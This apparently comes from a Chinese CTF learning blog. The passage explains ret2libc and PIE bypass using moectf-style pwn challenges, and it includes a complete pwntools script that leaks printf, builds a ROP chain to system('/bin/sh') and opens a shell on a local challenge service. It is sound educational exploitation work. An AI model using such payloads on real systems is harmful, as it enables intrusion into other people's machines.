+<td>程序中的跳板</td>
+<td>0x401040</td>
+</tr>
+<tr>
+<td>printf@got</td>
+<td>GOT表地址</td>
+<td>0x404018</td>
+</tr>
+<tr>
+<td>*printf@got</td>
+<td>libc真实地址</td>
+<td>0x7ffff7a6a5c0</td>
+</tr>
+<tr>
+<td>&amp;printf</td>
+<td>libc真实地址</td>
+<td>0x7ffff7a6a5c0</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><!--more-->
+<h3 id="moectf-认识libc"><a href="#moectf-认识libc" class="headerlink" title="moectf 认识libc"></a>moectf 认识libc</h3><!--more-->
+<p>这边需要首先进行patch的操作，流程如下：</p>
+<p>首先进入程序文件夹目录下，在当前文件夹内安装glibc all in one</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br></pre></td></tr></table></figure>
+<p>之后通过命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> list</span><br></pre></td></tr></table></figure>
+<p>查找可下载的glibc版本列表</p>
+<p>然后在程序目录下</p>
+<p>输入这个指令看程序使用的glibc的版本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so.6 | grep Ubuntu</span><br></pre></td></tr></table></figure>
+<p>然后下载对应的版本，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure>
+<p>然后回到程序的目录，将安装的东西复制过来：（动态连接器）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/ld-linux-x86-64.so.2 .</span><br></pre></td></tr></table></figure>
+<p>然后设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath . pwn</span><br></pre></td></tr></table></figure>
+<p>就完成了patch</p>
+<p>程序反汇编后的结果如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setup</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The Oracle speaks...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is no system function in the .text segment.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;A gift of forbidden knowledge, the location of &#x27;printf&#x27;: %p\n&quot;</span>, &amp;printf);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nNow, show me what you can do with this knowledge:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>checksec发现题目开启了nx保护，没有开启pie，可以正常打ret2libc</p>
+<p>而且题目泄露了printf的真实地址，再根据libc文件的printf偏移即可获取libc的基址，然后system函数的地址就能找到了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">43697</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_offset=libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">a=p.recvline()</span><br><span class="line">a=a[<span class="number">3</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a.decode())</span><br><span class="line">printf_real=<span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">base=printf_real-printf_offset</span><br><span class="line">system_offset=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system=base+system_offset</span><br><span class="line"></span><br><span class="line">bin_sh_addr =<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))+base</span><br><span class="line">ret = base + <span class="number">0x0000000000029139</span></span><br><span class="line">rdi_addr=<span class="number">0x000000000002a3e5</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(ret)+p64(rdi_addr)+p64(bin_sh_addr)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>需要注意的是：这边我们没有向程序bss段写入/bin/sh，而是采用了另外一种方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<p>这相当于是找到libc文件中第一个出现这个字符串的地址（不加next的话是返回一个生成器）</p>
+<p>还需要注意的是我们执行了pop rdi ret</p>
+<p>这不满足在正常call指令执行之前 rsp%16==0的条件，因此需要再ret一下让rsp+8</p>
+<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><!--more-->
+<p><strong>PIE（Position Independent Executable）</strong> 是一种二进制保护机制，意思是：</p>
+<blockquote>
+<p><strong>程序每次运行时加载地址都会随机变化。</strong></p>
+</blockquote>
+<p>它通常和 <strong>ASLR（地址空间随机化）</strong> 一起使用，用来防止攻击者通过固定地址进行利用（比如 ret2libc、ROP）。</p>
+<p>如果程序 <strong>没有开启 PIE</strong>：</p>
+<p>程序的代码段地址是 <strong>固定的</strong>。</p>
+<p>现代 Linux 通常是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASLR + PIE</span><br></pre></td></tr></table></figure>
+<p>随机化：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>区域</th>
+<th>是否随机</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>stack</td>
+<td>随机</td>
+</tr>
+<tr>
+<td>heap</td>
+<td>随机</td>
+</tr>
+<tr>
+<td>libc</td>
+<td>随机</td>
+</tr>
+<tr>
+<td>程序代码</td>
+<td>随机（PIE）</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="PIE-在-PWN-中怎么绕过"><a href="#PIE-在-PWN-中怎么绕过" class="headerlink" title="PIE 在 PWN 中怎么绕过"></a>PIE 在 PWN 中怎么绕过</h3><!--more-->
+<p>通常需要 <strong>信息泄露（leak）</strong>：</p>
+<p>例如泄露：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@GOT</span><br></pre></td></tr></table></figure>
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7e4d060</span><br></pre></td></tr></table></figure>
+<p>计算：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = leak - offset</span><br></pre></td></tr></table></figure>
+<p>然后算：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system = libc_base + offset</span><br></pre></td></tr></table></figure>
+<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><!--more-->
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is this?\nHow can I use %p without a backdoor? Damn!\n&quot;</span>, &amp;read);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something happening&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x60uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里本来马虎的认为直接就把read的真实地址打印出来然后泄露libc就能打了，结果发现并非这样。</p>
+<p>首先程序开启了NX和PIE保护</p>
+<p>PIE保护使程序的text段有一个随机的偏移，因此我们需要获取程序的基址</p>
+<p>程序刚开始的printf打印的是read@got中的值，但是由于动态链接和延迟响应的问题，在之前没有调用过read的情况下，read@got中存储的不是read函数的真实地址，而是read@plt+一个偏移</p>
+<p>根据gdb调试发现：打印出来的值指向如下的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x555555555060: endbr64</span><br><span class="line">0x555555555064: push   0x3</span><br><span class="line">0x555555555069: bnd jmp 0x555555555020</span><br><span class="line">0x55555555506f: nop</span><br></pre></td></tr></table></figure>
+<p>这个地址是 <strong>read 的 PLT trampoline（跳板代码）</strong>。</p>
+<p>程序启动时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read@got → read trampoline</span><br></pre></td></tr></table></figure>
+<p>原因是：</p>
+<blockquote>
+<p><strong>动态链接器还没有解析 <code>read</code> 在 libc 中的真实地址。</strong></p>
+</blockquote>
+<p>所以 GOT 先指向一段 <strong>“解析函数地址的跳板代码”</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">程序调用 read@plt (.plt.sec)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">jmp [read@got]</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">read trampoline (.plt)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">plt0 (resolver)</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">dynamic linker</span><br></pre></td></tr></table></figure>
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read@plt 只是入口</span><br><span class="line">真正负责解析地址的是 trampoline</span><br></pre></td></tr></table></figure>
+<p>因此：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read@got 初始指向 trampoline</span><br></pre></td></tr></table></figure>
+<p>而不是 <code>.plt.sec</code> 的 <code>read@plt</code>。</p>
+<p>据此打印出的地址以及ida直接看打印出来地址对应的汇编所对应的程序偏移，就能算出程序代码段的偏移了</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/" rel="prev" title="ROP链基础">
+                  <i class="fa fa-angle-left"></i> ROP链基础
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/07/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%86%B5%E5%AF%86%E6%9D%AF%E5%A4%8D%E7%8E%B0/" rel="next" title="第二届熵密杯复现">
+                  第二届熵密杯复现 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Hanson</span>
+  </div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
